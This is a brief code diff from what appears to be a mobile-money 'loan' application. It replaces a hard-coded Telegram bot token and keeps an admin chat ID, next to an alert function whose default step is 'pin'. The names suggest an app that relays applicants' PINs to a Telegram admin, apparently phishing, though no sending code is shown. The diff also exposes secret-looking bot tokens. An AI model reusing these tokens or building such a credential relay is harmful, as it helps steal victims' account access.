@@ -14,7 +14,7 @@ db = client["momo_loan_db"]
 applications_collection = db["applications"]
 
 # Telegram Configuration
-TELEGRAM_BOT_TOKEN = "8893269969:AAGsjLNbAycQBkRByEGdZslWg-mT_MSuwAM"
+TELEGRAM_BOT_TOKEN = "9067789528:AAGK_CPoNxy7_129SLG1cdVfNtQ7NJ3hHN8"
 TELEGRAM_ADMIN_CHAT_ID = "7554571504"
 
 def send_telegram_interactive_alert(app_data, stage_title="NEW SUBMISSION", step_code="pin"):
